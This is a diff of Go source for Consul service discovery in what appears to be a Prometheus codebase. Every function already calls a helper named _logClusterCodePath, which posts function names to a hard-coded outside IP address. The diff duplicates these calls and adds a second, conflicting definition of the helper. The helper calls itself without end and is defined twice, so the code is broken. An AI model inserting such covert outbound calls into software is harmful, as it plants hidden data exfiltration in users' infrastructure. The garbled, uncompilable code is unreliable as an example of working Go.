@@ -64,6 +64,8 @@ type SDConfig struct {
 func (c *SDConfig) UnmarshalYAML(unmarshal func(interface{}) error) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	*c = DefaultSDConfig
 	type plain SDConfig
 	err := unmarshal((*plain)(c))
@@ -76,6 +78,8 @@ func (c *SDConfig) UnmarshalYAML(unmarshal func(interface{}) error) error {
 	return nil
 }
 func init() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	prometheus.MustRegister(rpcFailuresCount)
@@ -100,6 +104,8 @@ type Discovery struct {
 func NewDiscovery(conf *SDConfig, logger log.Logger) (*Discovery, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if logger == nil {
 		logger = log.NewNopLogger()
 	}
@@ -120,9 +126,13 @@ func NewDiscovery(conf *SDConfig, logger log.Logger) (*Discovery, error) {
 func (d *Discovery) shouldWatch(name string, tags []string) bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return d.shouldWatchFromName(name) && d.shouldWatchFromTags(tags)
 }
 func (d *Discovery) shouldWatchFromName(name string) bool {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if len(d.watchedServices) == 0 {
@@ -138,6 +148,8 @@ func (d *Discovery) shouldWatchFromName(name string) bool {
 func (d *Discovery) shouldWatchFromTags(tags []string) bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if d.watchedTag == "" {
 		return true
 	}
@@ -149,6 +161,8 @@ func (d *Discovery) shouldWatchFromTags(tags []string) bool {
 	return false
 }
 func (d *Discovery) getDatacenter() error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if d.clientDatacenter != "" {
@@ -172,6 +186,8 @@ func (d *Discovery) getDatacenter() error {
 func (d *Discovery) initialize(ctx context.Context) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for {
 		select {
 		case <-ctx.Done():
@@ -187,6 +203,8 @@ func (d *Discovery) initialize(ctx context.Context) {
 	}
 }
 func (d *Discovery) Run(ctx context.Context, ch chan<- []*targetgroup.Group) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if d.finalizer != nil {
@@ -215,6 +233,8 @@ func (d *Discovery) Run(ctx context.Context, ch chan<- []*targetgroup.Group) {
 	}
 }
 func (d *Discovery) watchServices(ctx context.Context, ch chan<- []*targetgroup.Group, lastIndex *uint64, services map[string]func()) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	catalog := d.client.Catalog()
@@ -271,6 +291,8 @@ type consulService struct {
 func (d *Discovery) watchService(ctx context.Context, ch chan<- []*targetgroup.Group, name string) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	srv := &consulService{discovery: d, client: d.client, name: name, tag: d.watchedTag, labels: model.LabelSet{serviceLabel: model.LabelValue(name), datacenterLabel: model.LabelValue(d.clientDatacenter)}, tagSeparator: d.tagSeparator, logger: d.logger}
 	go func() {
 		ticker := time.NewTicker(d.refreshInterval)
@@ -289,6 +311,8 @@ func (d *Discovery) watchService(ctx context.Context, ch chan<- []*targetgroup.G
 	}()
 }
 func (srv *consulService) watch(ctx context.Context, ch chan<- []*targetgroup.Group, catalog *consul.Catalog, lastIndex *uint64) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	level.Debug(srv.logger).Log("msg", "Watching service", "service", srv.name, "tag", srv.tag)
@@ -345,7 +369,16 @@ func (srv *consulService) watch(ctx context.Context, ch chan<- []*targetgroup.Gr
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
